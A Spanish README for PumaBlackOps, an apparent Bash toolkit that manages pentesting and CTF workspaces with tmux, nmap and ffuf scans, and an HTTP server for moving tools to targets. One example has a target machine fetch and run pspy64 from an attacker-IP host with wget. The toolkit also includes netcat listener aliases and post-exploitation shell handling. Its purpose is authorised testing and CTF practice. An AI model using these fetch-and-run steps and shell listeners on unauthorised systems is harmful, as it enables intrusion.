# PumaBlackOps

**PumaBlackOps** es un conjunto de herramientas y scripts Bash para facilitar la gestión de objetivos, automatización de tareas y utilidades comunes en pentesting y CTFs, ahora con integración avanzada de tmux, flujos automáticos para CTF, autocompletado inteligente, rutas dinámicas y un servidor HTTP para herramientas de pentesting.

## 🚀 Quickstart

```bash
# 0. Instalar dependencias. -ESTO DEPENDE DE TU DISTRO, pero si usas Kali o alguna otra distro con apt:
sudo apt update
sudo apt install tmux ffuf nmap seclists jq xclip direnv

# 1. Clonar e inicializar
git clone https://github.com/IsaacNietoG/PumaBlackOps && cd PumaBlackOps
git submodule update --init --recursive

# 2.1 Agregar la suite a tu PATH:
./spells/add-bin-to-path.sh
# (el instalador te preguntará cómo deseas agregarlo a tu PATH)

# 2.2 Instalar autocompletado de comandos:
./spells/install-completion.sh
# (si utilizas un archivo de configuración para tu shell, hay instrucciones para instalar esto manualmente, porque sé q es feo que se metan en tus dotfiles jajaj)

# 3. Crear tu primer target y lanzar entorno tmux
target add vulnbox 192.168.1.100

# 4. Dentro del workspace, escanear y explorar
target scan all
target dirsearch 8080
target note "Encontrado panel admin en /admin"

# 5. (Opcional) Iniciar servidor HTTP para herramientas
assaultRepository start
```

**Características principales:**
- ✅ **Gestión automática de workspaces** con variables de entorno
- ✅ **Sesiones tmux integradas** con paneles preconfigurados (Recon/Exploit/Misc)
- ✅ **Autocompletado inteligente** con sugerencias contextuales
- ✅ **Escaneos automatizados** (nmap, ffuf, dirsearch)
- ✅ **Timer CTF visual** y macros para extracción de flags
- ✅ **Rutas dinámicas** - funciona desde cualquier ubicación
- ✅ **Servidor HTTP para herramientas** - compartir herramientas de pentesting fácilmente
- ✅ **Gestión de aliases** - carga automática de alias útiles

## Estructura del repositorio

```
.
├── aliases/
│   ├── all.sh
│   └── general.sh
├── assaultrepository/
│   └── (herramientas de pentesting compartidas)
├── bin/
│   ├── target
│   ├── assaultRepository
│   ├── ctflinpeas
│   └── penelope
├── lib/
│   ├── tmux_helpers.sh
│   ├── generate-tmux-config.sh
│   └── tmux-config.template
├── spells/
│   ├── add-bin-to-path.sh
│   ├── peass-ng.sh
│   ├── penelope.sh
│   ├── pspy64.sh
│   ├── source-aliases.sh
│   └── install-completion.sh
├── completions/
│   ├── target.bash
│   └── README.md
├── .config/
│   └── tmux/
│       ├── tmux.conf
│       └── plugins/
│           ├── tpm
│           ├── tmux
│           ├── tmux-resurrect
│           ├── tmux-sensible
│           └── tmux-yank
├── src/
└── README.md
```

---

## Descripción de carpetas y archivos principales

### `bin/`
Contiene herramientas principales y utilidades ejecutables:

- **target**: Script Bash principal para la gestión de workspaces de pentesting. Ahora automatiza la creación de sesiones tmux, paneles y flujos de trabajo para CTF.
- **assaultRepository**: **NUEVO** - Servidor HTTP para compartir herramientas de pentesting. Permite iniciar/detener un servidor HTTP que sirve archivos desde el directorio `assaultrepository/`, ideal para transferir herramientas a máquinas objetivo.
- **penelope**: Script Python descargado por `spells/penelope.sh`, herramienta para automatizar tareas de post-explotación y manejo de shells.

### `assaultrepository/`
**NUEVO** - Directorio que contiene herramientas de pentesting compartidas a través del servidor HTTP. Las herramientas se pueden agregar usando `assaultRepository add` y se sirven automáticamente cuando se inicia el servidor.
- **ctflinpeas**: Binario generado por el script `spells/peass-ng.sh`, versión personalizada de linPEAS para enumeración de privilegios en Linux.
- **pspy64**: Binario generado por el script `spells/pspy64.sh`, es una herramienta para inspeccionar procesos en ejecución en sistemas linux sin permisos de root.

### `lib/`
Scripts auxiliares para funcionalidades:

- **tmux_helpers.sh**: Funciones Bash para manipular títulos de paneles/ventanas y obtener información de tmux, usadas por el script `target` para integración avanzada.
- **generate-tmux-config.sh**: **NUEVO** - Script para generar configuraciones de tmux dinámicamente. Es utilizado por `target` para invocar las sesiones de tmux
- **tmux-config.template**: **NUEVO** - Plantilla para configuraciones de tmux.

### `spells/`
Scripts Bash para instalar, configurar o facilitar el uso de herramientas, nacen por la necesidad de automatizar varias tareas y además tener acceso a las ultimas versiones de las herramientas:

- **add-bin-to-path.sh**: Script interactivo para agregar el directorio `bin/` al PATH del usuario de varias formas (temporal, permanente, subshell, symlinks).
- **peass-ng.sh**: Descarga, compila y coloca una versión personalizada de linPEAS en `assaultrepository/ctflinpeas`.
- **penelope.sh**: Descarga y coloca la herramienta penelope en `bin/penelope`.
- **pspy64.sh**: **NUEVO** - Descarga la última versión de pspy64 desde GitHub y la coloca en `assaultrepository/pspy64`. pspy64 es una herramienta para monitorear procesos en sistemas Linux sin privilegios de root.
- **source-aliases.sh**: **NUEVO** - Script interactivo para cargar los aliases del proyecto de diferentes formas (temporal, permanente, subshell).
- **install-completion.sh**: Instala automáticamente el autocompletado bash para la herramienta `target`.

### `completions/`
Scripts de autocompletado para mejorar la experiencia de usuario:

- **target.bash**: Script de autocompletado bash para la herramienta `target` con sugerencias inteligentes y contextuales.
- **README.md**: Documentación en español sobre la instalación y uso del autocompletado.

### `aliases/`
Alias útiles para pentesting y manejo de shells:

- **general.sh**: Define alias como `httpserver` (servidor HTTP rápido con Python) y `listen` (listener con netcat). Se recomienda añadirlo al `.bashrc` o `.zshrc`.
- **all.sh**: **NUEVO** - Script que carga automáticamente todos los archivos `.sh` en el directorio de aliases (excepto a sí mismo). Útil para cargar todos los aliases del proyecto de una vez.

### `.config/tmux/`
Configuración avanzada de tmux para flujos de CTF:

- **tmux.conf**: Configuración personalizada de tmux con integración de mouse, atajos para selección de paneles, y plugins para mejorar la experiencia (TPM, tmux-sensible, tmux-resurrect, tmux-yank, dracula theme, etc). Incluye keybindings y macros para extracción de flags y manejo de timers CTF. **Nueva característica**: Rutas dinámicas que se calculan automáticamente basadas en la ubicación del archivo de configuración.
- **plugins/**: Plugins de tmux gestionados como submódulos git, necesarios para la funcionalidad extendida (ver sección de instalación).

### `src/`
Directorio reservado para código fuente adicional o scripts personalizados.

---

## Uso rápido de las herramientas principales

### `target` - Gestión de workspaces

El script `bin/target` permite gestionar workspaces de pentesting de forma sencilla y ahora automatiza la creación de entornos tmux listos para CTF. **Nueva característica**: Incluye autocompletado inteligente con sugerencias contextuales. Sus subcomandos principales son:

- `add <nombre_maquina> <IP>`: Crea un nuevo workspace para un objetivo, configura variables de entorno, y lanza automáticamente una sesión tmux con paneles para Recon, Exploit y Misc. Además, inicia un timer CTF y prepara comandos útiles en cada panel.
- `scan <nombre_maquina>`: Ejecuta un escaneo Nmap completo y guarda los resultados. Si se ejecuta dentro de tmux, el panel muestra el estado del escaneo dinámicamente.
- `list`: Lista todos los objetivos/workspaces creados.
- `info <nombre_maquina>`: Muestra información y estructura del objetivo.
- `note [nombre_maquina] <nota>`: Agrega una nota rápida al writeup del objetivo.
- `dirsearch [nombre_maquina] [puerto]`: Realiza una búsqueda recursiva de directorios con ffuf o dirsearch (si está disponible) usando SecLists.
- `help`: Muestra la ayuda y ejemplos de uso.
- `venv [nombre_maquina]`: Crea y configura un entorno virtual Python en el workspace del target, agregando la activación automática a .envrc (ideal para usar con direnv).

**Ejemplo de flujo de trabajo:**
```bash
# Crear un nuevo objetivo y lanzar entorno tmux listo para CTF
target add vulnbox 192.168.1.100

# Cambiar al directorio del objetivo
cd vulnbox

# Escanear con Nmap (el panel tmux mostrará el estado)
target scan

# Buscar directorios web en el puerto 8080
target dirsearch 8080

# Crear y activar entorno virtual Python para el target
target venv

# Agregar una nota rápida
target note "Encontrado panel de admin en /admin"
```

**Con autocompletado inteligente:**
```bash
target <TAB>                    # Muestra todos los comandos disponibles
target scan <TAB>               # Muestra subcomandos de escaneo
target info <TAB>               # Lista targets existentes
target dirsearch target1 <TAB>  # Sugiere puertos comunes
```

### `assaultRepository` - Servidor HTTP para herramientas

**NUEVO** - El script `bin/assaultRepository` proporciona un servidor HTTP para compartir herramientas de pentesting fácilmente. Es ideal para transferir herramientas a máquinas objetivo durante pentests.

**Subcomandos disponibles:**
- `start [puerto]`: Inicia el servidor HTTP (puerto por defecto: 8000)
- `stop`: Detiene el servidor HTTP
- `status`: Muestra el estado del servidor y estadísticas
- `add <nombre_herramienta> <ruta_archivo>`: Agrega una herramienta al repositorio
- `list`: Lista todas las herramientas disponibles en el repositorio
- `help`: Muestra la ayuda

**Ejemplo de uso:**
```bash
# Iniciar servidor en puerto 8000
assaultRepository start

# Agregar herramienta pspy64 al repositorio
assaultRepository add pspy64 /ruta/a/pspy64

# Ver herramientas disponibles
assaultRepository list

# Ver estado del servidor
assaultRepository status

# Detener servidor
assaultRepository stop
```

**Acceso desde máquina objetivo:**
```bash
# Descargar herramienta desde la máquina objetivo
wget http://IP_ATACANTE:8000/pspy64
chmod +x pspy64
./pspy64
```

---

## Integración avanzada con tmux y plugins

- Al crear un objetivo con `target add`, se lanza automáticamente una sesión tmux con:
  - Paneles y ventanas preconfigurados para Recon, Exploit y Misc.
  - Comandos útiles precargados (ej: penelope, macros para flags, etc).
  - Integración con plugins: tmux-resurrect (persistencia), tmux-yank (copiado), tmux-sensible, y el theme Dracula.
  - Timer CTF visual y macros para extracción de flags con atajos de teclado.
  - Automatización de la entrada en `/etc/hosts` para el target.
  - **Nueva característica**: Carga automática del archivo de configuración tmux del proyecto usando rutas dinámicas.
- El script `target` usa funciones de `lib/tmux_helpers.sh` para cambiar dinámicamente los títulos de paneles/ventanas según el estado de los escaneos.
- El archivo `.config/tmux/tmux.conf` define atajos y macros útiles para CTF, como extracción de flags, búsqueda de archivos, y control del timer. **Nueva característica**: Rutas dinámicas que se calculan automáticamente basadas en la ubicación del archivo de configuración.

## Autocompletado inteligente

- **Autocompletado contextual**: Diferentes sugerencias basadas en el comando actual y posición
- **Detección dinámica de targets**: Automáticamente detecta targets existentes buscando directorios con archivos `.envrc`
- **Sugerencias de puertos**: Números de puerto comunes para escaneo y búsqueda de directorios
- **Patrones IP**: Sugerencias de patrones de dirección IP comunes para nuevos targets
- **Instalación automática**: Script `spells/install-completion.sh` para configuración automática

---

## Requisitos

- Bash
- tmux (>=3.0) y los siguientes plugins (se instalan como submódulos):
  - tpm
  - tmux-sensible
  - tmux-resurrect
  - tmux-yank
  - dracula/tmux
- Python 3 (para penelope, httpserver y assaultRepository)
- ffuf (para dirsearch)
- nmap (para escaneo)
- git, wget, curl (para spells)
- jq (opcional, para mejor parsing JSON en spells)
- SecLists en `/usr/share/seclists` (para dirsearch)
- xclip (para integración de clipboard en tmux)
- direnv (para manejo automático de variables de entorno por workspace)

## Recomendado

- Personalizar los atajos de tmux en `.config/tmux/tmux.conf` según tus preferencias.
- Usar una terminal compatible con mouse y UTF-8 para aprovechar todos los features visuales.
- Configurar el servidor HTTP assaultRepository para transferir herramientas durante pentests.

---

## Créditos y licencias

- linPEAS/PEASS-ng: https://github.com/carlospolop/PEASS-ng
- penelope: https://github.com/brightio/penelope
- pspy64: https://github.com/DominicBreuker/pspy
- SecLists: https://github.com/danielmiessler/SecLists
- tmux-plugins/tpm: https://github.com/tmux-plugins/tpm
- tmux-plugins/tmux-sensible: https://github.com/tmux-plugins/tmux-sensible
- tmux-plugins/tmux-resurrect: https://github.com/tmux-plugins/tmux-resurrect
- tmux-plugins/tmux-yank: https://github.com/tmux-plugins/tmux-yank
- dracula/tmux: https://github.com/dracula/tmux
